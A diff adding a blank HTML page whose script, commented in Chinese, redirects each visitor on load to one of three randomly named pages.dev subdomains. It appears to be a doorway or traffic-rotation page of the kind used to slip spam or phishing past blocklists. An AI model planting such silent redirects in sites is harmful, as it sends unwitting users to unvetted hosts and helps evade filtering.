@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <script type="text/javascript">
+        // 定义域名列表
+        var domains = [
+            "http://874e1b04.sofi8ddh.pages.dev",
+            "http://65720bcc.sofi8ddh.pages.dev",
+            "http://dbf34b8b.sofi8ddh.pages.dev"
+            // 添加更多域名...
+        ];
+ 
+        // 随机选择一个域名
+        var randomDomain = domains[Math.floor(Math.random() * domains.length)];
+ 
+        // 页面加载完成后跳转
+        window.onload = function() {
+            window.location.href = randomDomain;
+        };
+    </script>
+</head>
+<body>
+    <p></p>
+</body>
+</html>
